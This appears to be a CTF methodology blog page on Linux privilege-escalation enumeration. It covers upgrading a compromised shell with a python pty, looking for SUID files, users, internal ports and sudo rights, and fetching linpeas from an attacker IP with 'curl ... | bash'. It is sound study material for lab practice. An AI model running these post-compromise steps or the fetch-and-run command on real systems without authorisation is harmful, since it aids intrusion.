---
layout: page
title: Enumeration for Linux Privesc
category: enum
type: ctf_methodology
desc: Enumeration process for privilege escalation in Linux
img-link: /writeups/htb/images/jadu/jadu-plum.png
---

# <span style="color:red">Enumeration for Linux Privilege Escalation</span>

This blog is about what enumeration process to go through once you have spawned a shell in Linux machine. 

## Developing your shell

- Python pty module:
<br />

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

<br />

- Push the shell to background:
<br />

```
Ctrl + z
```

- Examine current terminal and STTY info:
<br />

```
echo $TERM
stty -a
```

- Set current STTY
<br />

```
stty raw -echo
```

- Foreground:
<br />

```
fg
```

- Reinitialize:
<br />

```
reset
```

- Setup shell according to the local machine setting:
<br />

```
$ export SHELL=bash
$ export TERM=xterm256-color
$ stty rows 38 columns 116
```

## Folders & Files to check

#### linpeas.sh

Sending linpeas from local machine:
```
python3 -m http.server
python -m SimpleHTTPServer 9999
```
<br />

Receiving and running:
```
curl http://10.10.14.8:80/linpeas.sh | bash
```

#### users

- Check for group:
```
ash@tabby:~/test$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```
<br />

- Check what user has **/bin/bash**:
```
cat /etc/passwd | grep /bin/bash
```
<br />


-  Check for **SETUID** files:
```
 find / -perm -4000 -ls 2>/dev/null
 ```
<br />

- Check for files that user owns:
```
find / -user jadu 2>/dev/null
find / -user jadu 2>/dev/null | grep -Ev '(/proc/|/sys/)'
```

#### folder

- Check for different sites running:
```
/etc/apache2/sites-enabled
```
<br />


- Check on HTML files:

```
/var/www/html
```

#### Server

- Check what ports are open and running internally:
```
jimmy@openadmin:/var/www/internal$ ss -ltnp
State         Recv-Q         Send-Q                  Local Address:Port                  Peer Address:Port        
LISTEN        0              80                          127.0.0.1:3306                       0.0.0.0:*           
LISTEN        0              128                         127.0.0.1:52846                      0.0.0.0:*           
LISTEN        0              128                     127.0.0.53%lo:53                         0.0.0.0:*           
LISTEN        0              128                           0.0.0.0:22                         0.0.0.0:*           
LISTEN        0              128                                 *:80                               *:*           
LISTEN        0              128                              [::]:22                            [::]:*   ```
```

#### Privileges

- Check for files with sudo right:
```
sudo -S -l
```

## Sources
- https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/




